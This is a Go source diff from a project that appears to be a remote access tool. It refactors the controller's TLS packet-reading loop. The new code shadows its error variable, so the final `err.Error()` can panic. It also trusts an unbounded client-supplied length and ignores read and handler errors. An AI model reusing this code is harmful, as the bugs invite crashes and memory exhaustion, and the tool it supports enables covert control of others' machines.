@@ -2,10 +2,11 @@ package main
 
 import (
 	"crypto/tls"
-	"errors"
+	"encoding/binary"
+	"io"
 	"rat/command/log"
+	"rat/shared"
 	"rat/shared/network"
-	"strconv"
 )
 
 // TLSServer is the default TCP server using TLS encryption
@@ -42,39 +43,32 @@ func (server TLSServer) Listen() error {
 // ReadRoutine is the routine for continuously reading packets for this client
 // Removes client on any read error, invalid packet header or deserializing error
 func (server TLSServer) ReadRoutine(c *Client) {
+	var err error
 	for {
-		var packet interface{}
-		var err error
-
-		header, err := c.ReadHeader()
+		h, err := c.ReadHeader()
 
 		if err != nil {
-			goto err
+			break
 		}
 
-		packet = GetIncomingPacket(header)
-		if packet == nil {
-			err = errors.New("invalid header " + strconv.Itoa(int(header)))
-			goto err
-		}
+		var n int32
+		err = binary.Read(c.Reader.Reader, shared.ByteOrder, &n)
+		buf := make([]byte, n)
+		io.ReadFull(c.Reader.Reader, buf)
 
-		packet, err = c.Reader.ReadPacket(packet)
+		packet := GetIncomingPacket(h)
+
+		packet, err = packet.Decode(buf)
+
 		if err != nil {
-			goto err
+			break
 		}
 
-		err = packet.(IncomingPacket).OnReceive(c)
-		if err != nil {
-			goto err
-		}
-
-		continue
-
-	err:
-		log.Println("remove", err.Error())
-		removeClient(c)
-		break
+		packet.OnReceive(c)
 	}
+
+	log.Println("remove", err.Error())
+	removeClient(c)
 }
 
 // WriteRoutine polls all packets added to the packet channel for a specific client
